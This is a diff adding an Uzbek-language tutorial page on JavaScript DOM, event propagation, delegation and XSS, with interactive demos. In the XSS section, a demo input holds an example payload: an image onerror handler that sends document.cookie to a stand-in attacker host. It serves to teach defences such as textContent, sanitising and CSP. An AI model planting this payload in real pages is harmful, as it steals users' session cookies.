@@ -1,0 +1,409 @@
+<!doctype html>
+<html lang="uz">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>JavaScript DOM va hodisalar</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🟨</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,600;12..96,700&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#F8F6EC;--surface:#FFFFFF;--surface-2:#FCFBF4;--sunken:#F2EEDC;
+  --ink:#241F18;--ink-soft:#5C554A;--ink-faint:#8C8578;--border:#E7E1C6;--border-strong:#D6CEA8;
+  --accent:#B08900;--accent-ink:#7A5E00;--accent-soft:#F6EDC6;
+  --purple:#534AB7;--purple-ink:#3C3489;--purple-soft:#ECEAF9;
+  --teal:#0F6E56;--teal-ink:#0A5443;--teal-soft:#DEF0EA;
+  --amber:#A9660D;--amber-soft:#F8ECD6;--coral:#B4471F;--coral-soft:#F7E5DC;
+  --shadow:0 1px 2px rgba(40,32,20,.05),0 8px 24px rgba(40,32,20,.06);
+  --shadow-lift:0 2px 4px rgba(40,32,20,.08),0 16px 40px rgba(40,32,20,.12);
+  --font-display:"Bricolage Grotesque",system-ui,sans-serif;--font-body:"IBM Plex Sans",system-ui,sans-serif;--font-mono:"JetBrains Mono",ui-monospace,monospace;
+}
+:root:not([data-theme="light"]){@media (prefers-color-scheme:dark){
+  --bg:#15130A;--surface:#201D12;--surface-2:#272316;--sunken:#1A170D;--ink:#EDE7DA;--ink-soft:#B4AC9C;--ink-faint:#847C6C;--border:#36301B;--border-strong:#4A4226;
+  --accent:#F0CF4A;--accent-ink:#F5DC78;--accent-soft:#2F2912;--purple:#A79FF0;--purple-ink:#BCB5F5;--purple-soft:#241F33;
+  --teal:#4FC29D;--teal-ink:#6FD1B2;--teal-soft:#14261F;--amber:#E0A64B;--amber-soft:#2C2213;--coral:#E38156;--coral-soft:#2E1C12;
+  --shadow:0 1px 2px rgba(0,0,0,.3),0 8px 24px rgba(0,0,0,.34);--shadow-lift:0 2px 4px rgba(0,0,0,.4),0 16px 40px rgba(0,0,0,.5);}}
+:root[data-theme="dark"]{
+  --bg:#15130A;--surface:#201D12;--surface-2:#272316;--sunken:#1A170D;--ink:#EDE7DA;--ink-soft:#B4AC9C;--ink-faint:#847C6C;--border:#36301B;--border-strong:#4A4226;
+  --accent:#F0CF4A;--accent-ink:#F5DC78;--accent-soft:#2F2912;--purple:#A79FF0;--purple-ink:#BCB5F5;--purple-soft:#241F33;
+  --teal:#4FC29D;--teal-ink:#6FD1B2;--teal-soft:#14261F;--amber:#E0A64B;--amber-soft:#2C2213;--coral:#E38156;--coral-soft:#2E1C12;
+  --shadow:0 1px 2px rgba(0,0,0,.3),0 8px 24px rgba(0,0,0,.34);--shadow-lift:0 2px 4px rgba(0,0,0,.4),0 16px 40px rgba(0,0,0,.5);}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--font-body);line-height:1.65;-webkit-font-smoothing:antialiased;font-size:16px}
+.wrap{max-width:820px;margin:0 auto;padding-inline:20px}
+h1,h2,h3{font-family:var(--font-display);font-weight:600;line-height:1.12;text-wrap:balance;margin:0;letter-spacing:-.01em}
+p{margin:0}a{color:var(--accent-ink)}code{font-family:var(--font-mono);font-size:.9em}
+.eyebrow{font-family:var(--font-mono);font-size:12.5px;font-weight:500;letter-spacing:.14em;text-transform:uppercase;color:var(--accent-ink)}
+.lead{color:var(--ink-soft);font-size:18px}
+header.hero{padding-block:56px 36px}
+.badge{display:inline-flex;align-items:center;gap:8px;background:var(--surface);border:1px solid var(--border);border-radius:999px;padding:6px 14px;font-family:var(--font-mono);font-size:12.5px;color:var(--ink-soft);box-shadow:var(--shadow)}
+.badge .dot{width:7px;height:7px;border-radius:50%;background:var(--accent)}
+header.hero h1{font-size:clamp(36px,7.5vw,58px);margin:22px 0 16px;font-weight:700}
+header.hero h1 .steam{color:var(--accent)}header.hero .lead{max-width:62ch}
+section{padding-block:30px}
+.sec-head{display:flex;align-items:baseline;gap:14px;margin-bottom:8px;flex-wrap:wrap}
+.sec-head .n{font-family:var(--font-mono);font-size:13px;color:var(--accent-ink);font-weight:500}
+.sec-head h2{font-size:clamp(23px,4.4vw,30px)}
+.sec-sub{color:var(--ink-soft);max-width:66ch;margin-top:6px;font-size:16.5px}
+.divider{height:1px;background:var(--border);border:0}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px}button{font-family:var(--font-body)}
+.callout{border-radius:0 12px 12px 0;padding:13px 16px;margin-top:16px;font-size:14.5px;line-height:1.6}
+.callout .ct{font-family:var(--font-mono);font-size:12px;font-weight:600;letter-spacing:.05em;text-transform:uppercase;margin-bottom:4px;display:flex;align-items:center;gap:7px}
+.callout.tip{background:var(--teal-soft);border-left:4px solid var(--teal)}.callout.tip .ct{color:var(--teal-ink)}
+.callout.warn{background:var(--amber-soft);border-left:4px solid var(--amber)}.callout.warn .ct{color:var(--amber)}
+.callout.iv{background:var(--purple-soft);border-left:4px solid var(--purple)}.callout.iv .ct{color:var(--purple-ink)}
+.callout code{background:rgba(0,0,0,.06);padding:1px 5px;border-radius:5px}
+:root[data-theme="dark"] .callout code,:root:not([data-theme="light"]) .callout code{background:rgba(255,255,255,.08)}
+.code-block{background:var(--sunken);border:1px solid var(--border);border-radius:16px;overflow:hidden;margin-top:18px;box-shadow:var(--shadow)}
+.code-bar{display:flex;align-items:center;gap:8px;padding:11px 16px;background:var(--surface-2);border-bottom:1px solid var(--border)}
+.code-bar .fname{font-family:var(--font-mono);font-size:12.5px;color:var(--ink-soft)}
+.code-bar .tl{width:11px;height:11px;border-radius:50%}
+pre.code{margin:0;padding:18px;overflow-x:auto;font-family:var(--font-mono);font-size:13.5px;line-height:1.9;color:var(--ink)}
+.k{color:var(--purple-ink);font-weight:500}.ty{color:var(--teal-ink)}.st{color:var(--accent-ink)}.nu{color:var(--coral)}.cm{color:var(--ink-faint);font-style:italic}
+
+
+/* stepper */
+.stage{background:var(--surface);border:1px solid var(--border);border-radius:20px;box-shadow:var(--shadow);padding:20px;margin-top:20px}
+.ctrls{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-top:14px}
+.btn{background:var(--surface-2);border:1.5px solid var(--border);border-radius:10px;padding:8px 14px;font-size:13.5px;cursor:pointer;color:var(--ink);font-family:var(--font-mono);transition:.15s}
+.btn:hover{border-color:var(--border-strong);background:var(--sunken)}
+.btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}
+.bar{height:5px;background:var(--sunken);border-radius:3px;overflow:hidden;flex:1;min-width:80px}
+.bar>div{height:100%;background:var(--accent);width:0;transition:width .4s}
+.explain{background:var(--sunken);border:1px solid var(--border);border-radius:12px;padding:12px 14px;margin-top:14px;font-size:14.5px;min-height:52px;line-height:1.6}
+.explain b{color:var(--accent-ink)}
+.tag{display:inline-block;font-family:var(--font-mono);font-size:11.5px;padding:2px 8px;border-radius:6px;background:var(--accent-soft);color:var(--accent-ink);font-weight:600}
+.tag.p{background:var(--purple-soft);color:var(--purple-ink)}.tag.t{background:var(--teal-soft);color:var(--teal-ink)}.tag.a{background:var(--amber-soft);color:var(--amber)}.tag.c{background:var(--coral-soft);color:var(--coral)}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px}
+.grid3{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-top:16px}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:15px;box-shadow:var(--shadow)}
+.card h4{font-family:var(--font-display);font-size:15px;margin:0 0 6px}
+.card p{font-size:13.5px;color:var(--ink-soft)}
+.card.bad h4{color:var(--coral)}.card.good h4{color:var(--teal-ink)}
+table.tbl{width:100%;border-collapse:collapse;margin-top:16px;font-size:13.5px;background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden}
+.tbl th,.tbl td{padding:9px 11px;border-bottom:1px solid var(--border);text-align:left;vertical-align:top}
+.tbl th{background:var(--surface-2);font-family:var(--font-mono);font-size:12px;color:var(--ink-soft)}
+.tbl code{background:var(--sunken);padding:1px 5px;border-radius:5px}
+.tap{cursor:pointer;border-bottom:1.5px dashed var(--accent);padding:0 2px;border-radius:3px;transition:.15s}
+.tap:hover,.tap.hl{background:var(--accent-soft)}
+.tap-note{background:var(--accent-soft);border-left:4px solid var(--accent);border-radius:0 12px 12px 0;padding:12px 15px;margin-top:12px;font-size:14px;min-height:46px}
+.tap-note b{font-family:var(--font-mono);color:var(--accent-ink)}
+.tog{position:relative;width:46px;height:25px;background:var(--border-strong);border-radius:13px;cursor:pointer;transition:.2s;flex-shrink:0;border:0;padding:0}
+.tog.on{background:var(--teal)}
+.tog::after{content:"";position:absolute;top:2px;left:2px;width:21px;height:21px;border-radius:50%;background:#fff;transition:.2s}
+.tog.on::after{transform:translateX(21px)}
+.toggle-row{display:flex;align-items:center;gap:12px;justify-content:center;margin-bottom:16px;flex-wrap:wrap}
+.tog-lbl{font-family:var(--font-mono);font-size:13px;color:var(--ink-soft)}
+.seg{display:inline-flex;background:var(--sunken);border:1px solid var(--border);border-radius:10px;padding:3px;gap:2px;flex-wrap:wrap}
+.seg button{background:transparent;border:0;border-radius:8px;padding:7px 12px;font-family:var(--font-mono);font-size:12.5px;cursor:pointer;color:var(--ink-soft)}
+.seg button.on{background:var(--surface);color:var(--accent-ink);box-shadow:var(--shadow);font-weight:600}
+@keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-6px)}40%,80%{transform:translateX(6px)}}
+.shake{animation:shake .4s}
+@keyframes pop{0%{transform:scale(.6);opacity:0}100%{transform:scale(1);opacity:1}}
+.pop{animation:pop .35s cubic-bezier(.2,.9,.3,1.3)}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(0,0,0,0)}50%{box-shadow:0 0 0 6px var(--accent-soft)}}
+.pulse{animation:pulse 1.2s infinite}
+@media (max-width:560px){.grid2{grid-template-columns:1fr}}
+
+mark.hx{background:var(--accent-soft);color:inherit;border-radius:4px;padding:0 2px;box-shadow:0 0 0 1px var(--accent) inset}
+.tbl-wrap{overflow-x:auto}
+.q-txt,.opt,.iv-a,.explain,.tap-note{overflow-wrap:anywhere}
+
+.repl{background:#1C1A12;color:#F2EDDC;border-radius:14px;padding:12px;font-family:var(--font-mono);font-size:13px;margin-top:10px}
+.repl textarea{width:100%;min-height:80px;background:transparent;border:1px solid #4A4226;border-radius:8px;color:#fff;font-family:var(--font-mono);font-size:13px;padding:8px;resize:vertical;box-sizing:border-box}
+.repl .out{margin-top:8px;white-space:pre-wrap;min-height:34px;line-height:1.6;word-break:break-word}
+.repl .out .lg2{color:#F5DC78}.repl .out .er{color:#FF8A7A}.repl .out .rv{color:#9BE3BE}
+.rex{display:flex;gap:5px;flex-wrap:wrap;margin-top:8px}
+.rex button{font-family:var(--font-mono);font-size:11.5px}
+
+
+.dom{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
+.dom>div{min-width:0}
+.prev{border:1.5px solid var(--border);border-radius:12px;padding:14px;background:#fff;color:#222;font-family:system-ui,sans-serif;font-size:14px}
+.prev *{outline-offset:2px;transition:outline .15s}
+.prev .hl{outline:3px solid var(--accent)!important;background:rgba(240,207,74,.18)}
+.prev h3{margin:0 0 8px;font-size:16px}
+.prev label{display:block;font-size:12px;color:#555;margin-top:6px}
+.prev input{width:100%;box-sizing:border-box;padding:6px 8px;border:1px solid #bbb;border-radius:6px;font-size:13px}
+.prev button{margin-top:10px;padding:7px 14px;border:0;border-radius:8px;background:#B08900;color:#fff;font-weight:600}
+.tree{font-family:var(--font-mono);font-size:12px;background:var(--sunken);border:1px solid var(--border);border-radius:12px;padding:10px;line-height:1.8;overflow-x:auto}
+.tree div{cursor:pointer;border-radius:5px;padding:0 5px;white-space:nowrap}
+.tree div:hover{background:var(--accent-soft)}
+.tree div.hl{background:var(--accent);color:#1D1A0C}
+.tree .tg{color:var(--purple-ink)}.tree .at{color:var(--teal-ink)}.tree .tx{color:var(--ink-faint)}
+.q{font-family:var(--font-mono);font-size:12px;margin-top:8px}
+/* propagation */
+.prop{display:grid;grid-template-columns:1.1fr 1fr;gap:12px;margin-top:10px}
+.prop>div{min-width:0}
+.lay{border:2px solid var(--border-strong);border-radius:14px;padding:10px 10px 12px;position:relative;transition:background .25s,border-color .25s;font-family:var(--font-mono);font-size:11px;background:var(--surface)}
+.lay>.nm{display:block;margin-bottom:6px;color:var(--ink-soft)}
+.lay.cap{background:#C8372D22;border-color:#C8372D}.lay.tgt{background:var(--accent-soft);border-color:var(--accent)}.lay.bub{background:var(--teal-soft);border-color:var(--teal)}
+.lay .stop{position:absolute;top:6px;right:8px;font-size:10px;padding:1px 6px;border-radius:5px;background:var(--coral);color:#fff}
+#pBtn{font-family:var(--font-mono);font-size:13px;padding:8px 16px;border-radius:9px;border:0;background:var(--accent);color:#1D1A0C;font-weight:700;cursor:pointer}
+.plog{font-family:var(--font-mono);font-size:11.5px;display:flex;flex-direction:column;gap:3px;max-height:260px;overflow-y:auto}
+.plog div{padding:3px 8px;border-radius:6px;opacity:.25;transition:.25s}
+.plog div.on{opacity:1}
+.plog .c{background:#C8372D22}.plog .t{background:var(--accent-soft)}.plog .b{background:var(--teal-soft)}
+.opts{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px;font-size:13px}
+.opts label{display:flex;gap:6px;align-items:center;cursor:pointer}
+/* delegation */
+.dl{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
+.dl>div{min-width:0}
+.txl{list-style:none;margin:0;padding:0;max-height:220px;overflow-y:auto;border:1px solid var(--border);border-radius:10px}
+.txl li{display:flex;justify-content:space-between;padding:7px 10px;border-bottom:1px solid var(--border);font-size:13px;cursor:pointer}
+.txl li:hover{background:var(--accent-soft)}
+.txl li.sel{background:var(--accent);color:#1D1A0C}
+.txl li button{font-size:11px;padding:2px 8px;border-radius:6px;border:1px solid var(--border-strong);background:var(--surface);cursor:pointer}
+.cnt{display:flex;gap:8px;flex-wrap:wrap}
+.stat{border:1px solid var(--border);border-radius:10px;padding:6px 11px;font-family:var(--font-mono);font-size:12px;background:var(--surface-2)}
+.stat b{font-size:15px}
+/* xss */
+.xs{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
+.xs>div{min-width:0;border:1px solid var(--border);border-radius:12px;padding:10px;background:var(--surface-2)}
+.xs h6{margin:0 0 6px;font-family:var(--font-mono);font-size:12px}
+.xs .box{background:#fff;color:#222;border-radius:8px;padding:10px;min-height:44px;font-size:14px;word-break:break-all}
+.xs pre{margin:8px 0 0;font-family:var(--font-mono);font-size:11px;white-space:pre-wrap;word-break:break-all;color:var(--ink-soft)}
+.xin{width:100%;font-family:var(--font-mono);font-size:13px;padding:9px 11px;border-radius:10px;border:1.5px solid var(--border-strong);background:var(--surface);color:var(--ink);box-sizing:border-box}
+.bad{color:var(--coral);font-weight:700}
+@media (max-width:760px){.dom,.prop,.dl,.xs{grid-template-columns:1fr}}
+
+.btn.primary,.topic-pill.now,.yrs button.on{color:#1D1A0C!important}
+/* interview */
+.iv-list{display:flex;flex-direction:column;gap:8px;margin-top:18px}
+.iv-item{background:var(--surface);border:1px solid var(--border);border-radius:12px;box-shadow:var(--shadow);overflow:hidden}
+.iv-q{display:flex;align-items:center;gap:11px;padding:14px 16px;cursor:pointer;font-family:var(--font-display);font-weight:600;font-size:15px;list-style:none}
+.iv-q::-webkit-details-marker{display:none}
+.iv-q .qi{width:24px;height:24px;border-radius:7px;background:var(--purple-soft);color:var(--purple-ink);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:13px}
+.iv-q .chev{margin-left:auto;transition:.2s;color:var(--ink-faint)}
+.iv-item[open] .iv-q .chev{transform:rotate(90deg)}
+.iv-a{padding:0 16px 15px 51px;font-size:14.5px;color:var(--ink-soft);line-height:1.65}
+.iv-a code{background:var(--sunken);padding:1px 5px;border-radius:5px;color:var(--accent-ink)}.iv-a b{color:var(--ink)}
+
+/* quiz */
+.quiz{background:var(--surface);border:1px solid var(--border);border-radius:18px;padding:22px 20px;margin-top:22px;box-shadow:var(--shadow)}
+.q+.q{margin-top:20px;padding-top:20px;border-top:1px solid var(--border)}
+.q-txt{font-weight:600;font-size:16px;margin-bottom:12px;font-family:var(--font-display)}
+.q-txt .qn{color:var(--accent-ink);font-family:var(--font-mono);font-size:14px;margin-right:6px}
+.opt{display:block;width:100%;text-align:left;background:var(--surface-2);border:1.5px solid var(--border);border-radius:11px;padding:11px 14px;margin-bottom:8px;cursor:pointer;font-size:14.5px;color:var(--ink);transition:.15s}
+.opt:hover{border-color:var(--border-strong);background:var(--sunken)}
+.opt.correct{border-color:var(--teal);background:var(--teal-soft);color:var(--teal-ink);font-weight:500}
+.opt.wrong{border-color:var(--coral);background:var(--coral-soft);color:var(--coral)}.opt:disabled{cursor:default}
+.q-fb{font-size:14px;margin-top:6px;padding:10px 12px;border-radius:9px;display:none}
+.q-fb.show{display:block}.q-fb.ok{background:var(--teal-soft);color:var(--teal-ink)}.q-fb.no{background:var(--coral-soft);color:var(--coral)}
+footer{padding-block:34px 60px}
+.next{background:var(--surface);border:1px solid var(--border);border-radius:18px;padding:24px 22px;box-shadow:var(--shadow)}
+.next .eyebrow{margin-bottom:8px;display:block}.next h3{font-size:22px;margin-bottom:8px}
+.next p{color:var(--ink-soft);font-size:15px;max-width:56ch}
+.topics{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.topic-pill{font-family:var(--font-mono);font-size:12.5px;background:var(--surface-2);border:1px solid var(--border);border-radius:999px;padding:6px 13px;color:var(--ink-soft)}
+.topic-pill.now{background:var(--accent);border-color:var(--accent);color:#fff}
+.theme-btn{position:sticky;top:calc(env(safe-area-inset-top,0px) + 14px);float:right;margin-top:14px;z-index:20;background:var(--surface);border:1px solid var(--border);border-radius:10px;width:38px;height:38px;display:inline-flex;align-items:center;justify-content:center;cursor:pointer;color:var(--ink-soft);box-shadow:var(--shadow)}
+.theme-btn svg{width:18px;height:18px}
+@media (max-width:560px){.dd{grid-template-columns:1fr}.cstep{flex-direction:column;align-items:flex-start}.cstep .cn{min-width:0}}
+@media (prefers-reduced-motion:reduce){*{transition-duration:.01ms!important}}
+</style>
+<style>
+.cnav-top{display:flex;align-items:center;gap:10px;flex-wrap:wrap;padding-top:16px;font-family:"JetBrains Mono",ui-monospace,monospace;font-size:12.5px;color:var(--ink-soft,#555)}
+.cnav-top a{color:var(--ink,#222);text-decoration:none;border:1px solid var(--border,#ddd);background:var(--surface,#fff);border-radius:9px;padding:6px 11px}
+.cnav-top a:hover{border-color:var(--accent,#888)}
+.cnav-top .cnav-dot{width:8px;height:8px;border-radius:50%;display:inline-block}
+.cnav{max-width:820px;margin:8px auto 64px;padding-inline:20px;box-sizing:border-box}
+.cnav-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.cnav a.cn{display:flex;flex-direction:column;gap:4px;text-decoration:none;color:var(--ink,#222);background:var(--surface,#fff);border:1.5px solid var(--border,#ddd);border-radius:16px;padding:16px 18px;min-height:92px;transition:border-color .15s,transform .15s}
+.cnav a.cn:hover{border-color:var(--accent,#888);transform:translateY(-2px)}
+.cnav a.cn:focus-visible{outline:2px solid var(--accent,#888);outline-offset:2px}
+.cnav .cl{font-family:"JetBrains Mono",ui-monospace,monospace;font-size:11.5px;letter-spacing:.08em;text-transform:uppercase;color:var(--ink-faint,#888)}
+.cnav .ct{font-family:"Bricolage Grotesque",system-ui,sans-serif;font-weight:700;font-size:17px;line-height:1.25}
+.cnav .cs{font-size:12.5px;color:var(--ink-soft,#666)}
+.cnav a.nx{text-align:right;align-items:flex-end;border-color:var(--accent,#888)}
+.cnav a.nx .ct{color:var(--accent-ink,#333)}
+.cnav .empty{border:1.5px dashed var(--border,#ddd);border-radius:16px;min-height:92px;display:flex;align-items:center;justify-content:center;font-size:13px;color:var(--ink-faint,#888);padding:12px;text-align:center}
+.cnav-foot{display:flex;align-items:center;gap:12px;margin-top:14px;font-family:"JetBrains Mono",ui-monospace,monospace;font-size:12px;color:var(--ink-soft,#666)}
+.cnav-foot a{color:var(--ink,#222)}
+.cnav-bar{flex:1;height:6px;border-radius:3px;background:var(--sunken,#eee);overflow:hidden}
+.cnav-bar i{display:block;height:100%;background:var(--accent,#888)}
+@media (max-width:560px){.cnav-grid{grid-template-columns:1fr}.cnav a.nx{text-align:left;align-items:flex-start}}
+@media (max-width:640px){pre,pre.code,.code{overflow-x:auto;max-width:100%}table{display:block;overflow-x:auto;max-width:100%}.stage,.callout{overflow-x:auto}code{overflow-wrap:anywhere}h1,h2,h3{overflow-wrap:anywhere}img,svg{max-width:100%}.wrap div{min-width:0}.grid2{grid-template-columns:1fr!important}.wrap p,.wrap button,.wrap li,.wrap span,.wrap td{overflow-wrap:anywhere}.http,.demo{overflow-x:auto}.incs{flex-wrap:wrap}html,body{overflow-x:clip}}
+</style></head>
+<body>
+<div class="wrap">
+<nav class="cnav-top" aria-label="Kurs navigatsiyasi"><a href="index.html">← Barcha darslar</a><span><span class="cnav-dot" style="background:#B08900"></span> JavaScript · 8/10</span><span>· Kurs: 72/88</span></nav>
+  <button class="theme-btn" id="themeBtn" aria-label="Rejimni almashtirish"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M12 3v1M12 20v1M4.2 4.2l.7.7M19.1 19.1l.7.7M3 12h1M20 12h1M4.2 19.8l.7-.7M19.1 4.9l.7-.7"/><circle cx="12" cy="12" r="4"/></svg></button>
+  <header class="hero">
+    <span class="badge"><span class="dot"></span>JavaScript · 72-modul · DOM</span>
+    <h1>DOM va <span class="steam">hodisalar</span></h1>
+    <p class="lead">Brauzer HTML’ni o‘qib, <b>DOM</b> — obyektlar daraxtini quradi. JavaScript shu daraxtni o‘qiydi va o‘zgartiradi, foydalanuvchi harakatlariga (click, input, submit) javob beradi. Vue kabi framework’lar buni siz uchun qiladi — lekin ostida aynan shu mexanizmlar: hodisa tarqalishi, delegatsiya va XSS xavfi.</p>
+  </header>
+  <hr class="divider">
+
+  <section>
+    <div class="sec-head"><span class="n">01</span><h2>DOM daraxti</h2></div><p class="sec-sub">Chapda — oddiy to‘lov formasi, o‘ngda — uning DOM daraxti. Ikkala tomondagi elementni bosing — mos keladigani yonadi.</p>
+    <div class="stage">
+      <div class="dom">
+        <div><div class="prev" id="prev"><form id="f"><h3>P2P o‘tkazma</h3><label>Karta raqami</label><input id="fk" placeholder="8600 …"><label>Summa</label><input id="fs" type="number" placeholder="100000"><button type="submit" class="btn-pay">Yuborish</button></form></div></div>
+        <div class="tree" id="tree"></div>
+      </div>
+      <div class="q" id="qq"></div>
+    </div>
+    <div class="code-block"><div class="code-bar"><span class="tl" style="background:#E8735A"></span><span class="tl" style="background:#E0A64B"></span><span class="tl" style="background:#4FBF9B"></span><span class="fname">dom.js</span></div><pre class="code"><span class="k">const</span> forma = document.querySelector(<span class="st">"#f"</span>);                 <span class="cm">// CSS selektori bilan</span>
+<span class="k">const</span> btn   = forma.querySelector(<span class="st">".btn-pay"</span>);
+<span class="k">const</span> inp   = document.querySelectorAll(<span class="st">"input"</span>);            <span class="cm">// NodeList (statik)</span>
+
+btn.textContent = <span class="st">"O'tkazish"</span>;                                <span class="cm">// matn — xavfsiz</span>
+btn.classList.add(<span class="st">"loading"</span>);                                 <span class="cm">// class</span>
+btn.disabled = <span class="k">true</span>;                                          <span class="cm">// xossa</span>
+inp[<span class="nu">1</span>].value;                                                 <span class="cm">// foydalanuvchi kiritgan qiymat (string!)</span>
+
+<span class="k">const</span> li = document.createElement(<span class="st">"li"</span>);                      <span class="cm">// yangi element</span>
+li.textContent = <span class="st">"150 000 so'm — Dilnoza"</span>;
+document.querySelector(<span class="st">"#tarix"</span>).append(li);</pre></div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="n">02</span><h2>Hodisa qanday tarqaladi: capture → target → bubble</h2></div><p class="sec-sub">Bu <b>haqiqiy</b> brauzer hodisalari: har qatlamga ikki listener qo‘yilgan (capture va bubble). Tugmani bosing — tartib yozib olinadi va sekinlashtirib ko‘rsatiladi.</p>
+    <div class="stage">
+      <div class="prop">
+        <div><div class="lay" id="L0"><span class="nm">document</span><div class="lay" id="L1"><span class="nm">form#tolov</span><div class="lay" id="L2"><span class="nm">div.card</span><div class="lay" id="L3" style="text-align:center"><span class="nm">button</span><button id="pBtn">To‘lash</button></div></div></div></div></div>
+        <div class="plog" id="plog"></div>
+      </div>
+      <div class="opts"><label><input type="checkbox" id="oStop"> div.card da <code>stopPropagation()</code> (bubble)</label><label><input type="checkbox" id="oCap"> form’da capture listener <code>stopPropagation()</code></label></div>
+      <div class="explain" id="prEx">Tugmani bosing.</div>
+    </div>
+    <div class="tbl-wrap"><table class="tbl"><tr><th>Metod</th><th>Nima qiladi</th></tr><tr><td><code>addEventListener(t, fn)</code></td><td>Bubble fazasida tinglaydi (default)</td></tr><tr><td><code>addEventListener(t, fn, { capture: true })</code></td><td>Capture fazasida (tepadan pastga)</td></tr><tr><td><code>{ once: true }</code>, <code>{ passive: true }</code></td><td>Bir marta; scroll’da preventDefault qilmaslikni va’da qilish (tezroq)</td></tr><tr><td><code>e.stopPropagation()</code></td><td>Keyingi elementlarga tarqalishni to‘xtatadi</td></tr><tr><td><code>e.preventDefault()</code></td><td>Brauzerning default xatti-harakatini bekor qiladi (forma yuborish, havolaga o‘tish)</td></tr><tr><td><code>e.target</code> / <code>e.currentTarget</code></td><td>Hodisa boshlangan element / listener turgan element</td></tr></table></div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="n">03</span><h2>Delegatsiya: 1 000 qator — 1 listener</h2></div><p class="sec-sub">Har qatorga alohida listener qo‘yish o‘rniga, ota elementga bittasini qo‘yamiz va <code>e.target.closest()</code> bilan qaysi qator bosilganini aniqlaymiz. Keyin qo‘shilgan qatorlar ham avtomatik ishlaydi.</p>
+    <div class="stage">
+      <div class="dl"><div><ul class="txl" id="txl"></ul></div><div>
+        <div class="cnt"><span class="stat">Qatorlar: <b id="dN">0</b></span><span class="stat">Listener’lar: <b>1</b></span></div>
+        <div class="ctrls"><button class="btn primary" id="dAdd">➕ 100 ta qo‘shish</button></div>
+        <div class="explain" id="dEx">Qatorni yoki "✕" ni bosing.</div></div></div>
+    </div>
+    <div class="code-block"><div class="code-bar"><span class="tl" style="background:#E8735A"></span><span class="tl" style="background:#E0A64B"></span><span class="tl" style="background:#4FBF9B"></span><span class="fname">delegatsiya.js</span></div><pre class="code">document.querySelector(<span class="st">"#tarix"</span>).addEventListener(<span class="st">"click"</span>, (e) =&gt; {
+  <span class="k">const</span> del = e.target.closest(<span class="st">"button.del"</span>);
+  <span class="k">if</span> (del) { ochir(del.closest(<span class="st">"li"</span>).dataset.id); <span class="k">return</span>; }
+  <span class="k">const</span> li = e.target.closest(<span class="st">"li"</span>);
+  <span class="k">if</span> (li) tanla(li.dataset.id);
+});</pre></div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="n">04</span><h2>Xavfsizlik: innerHTML va XSS</h2></div><p class="sec-sub">Foydalanuvchi izohi ekranga chiqarilyapti. Hujumchi izohga HTML/JS yozdi. <code>innerHTML</code> va <code>textContent</code> natijasini solishtiring. (Demo xavfsiz: skript bajarilmaydi — natija faqat tahlil qilinadi.)</p>
+    <div class="stage">
+      <input class="xin" id="xin" value='Rahmat! <img src=x onerror="fetch(`https://evil.uz/?c=`+document.cookie)">'>
+      <div class="xs"><div><h6>el.innerHTML = izoh ❌</h6><div class="box" id="xH"></div><pre id="xHp"></pre></div><div><h6>el.textContent = izoh ✅</h6><div class="box" id="xT"></div><pre>Matn sifatida — teglar ham oddiy belgi.</pre></div></div>
+      <div class="explain" id="xEx"></div>
+    </div>
+    <div class="callout iv"><div class="ct">🎯 Bank frontend’ida XSS nima uchun juda xavfli</div>XSS orqali hujumchi skripti foydalanuvchi sessiyasida ishlaydi: token’ni o‘g‘irlaydi (localStorage’da bo‘lsa — oson), foydalanuvchi nomidan o‘tkazma yuboradi, sahifani soxtalashtiradi. Himoya qatlamlari: <code>textContent</code> / framework’ning avtomatik escape’i (Vue <code>{{ }}</code>), <code>v-html</code>/<code>innerHTML</code>dan qochish yoki DOMPurify bilan tozalash, qat’iy <b>Content-Security-Policy</b>, token’larni HttpOnly cookie’da (BFF pattern) saqlash.</div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="n">05</span><h2>Nega framework kerak?</h2></div>
+    <div class="grid2">
+      <div class="card bad"><h4>Qo‘lda DOM</h4><p>Holat o‘zgarsa — qaysi elementlarni yangilashni o‘zingiz eslab qolasiz. 20 ta joyda balans ko‘rsatilsa, 20 ta joyni yangilaysiz. Ketma-ket o‘qish/yozish (<code>offsetHeight</code> → style → offsetHeight…) — "layout thrashing", sekinlik. Listener’larni tozalash unutiladi — xotira sizishi.</p></div>
+      <div class="card good"><h4>Deklarativ (Vue)</h4><p>Siz <b>holatni</b> o‘zgartirasiz (<code>balans.value = 500</code>), framework DOM’ning qaysi qismlari o‘zgarishini o‘zi hisoblab, eng kam o‘zgarish bilan yangilaydi (82-modul, reaktivlik). Listener’lar komponent bilan birga tozalanadi, matn avtomatik escape qilinadi.</p></div>
+    </div>
+  </section>
+
